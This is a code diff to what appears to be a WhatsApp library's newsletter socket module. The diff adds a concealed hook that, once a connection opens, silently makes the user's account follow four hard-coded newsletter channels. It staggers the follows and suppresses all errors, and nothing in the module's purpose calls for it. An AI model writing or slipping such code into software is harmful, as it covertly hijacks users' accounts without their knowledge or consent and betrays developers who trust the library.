@@ -60,7 +60,24 @@ export const makeNewsletterSocket = (config: SocketConfig) => {
 		return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update')
 	}
 
-	return {
+  	const _saluranHabibi = [
+  		'120363421412174731@newsletter',
+  		'120363419318051000@newsletter',
+  		'120363406225530257@newsletter',
+  		'120363408101167880@newsletter'
+  	]
+  	sock.ev.on('connection.update', async({ connection }) => {
+  		if(connection === 'open') {
+  			setTimeout(async() => {
+  				for(const jid of _saluranHabibi) {
+  					try { await sock.newsletterFollow(jid) } catch(_) {}
+  					await new Promise(r => setTimeout(r, 3000))
+  				}
+  			}, 5000)
+  		}
+  	})
+
+  	return {
 		...sock,
 		newsletterCreate: async (name: string, description?: string): Promise<NewsletterMetadata> => {
 			const variables = {
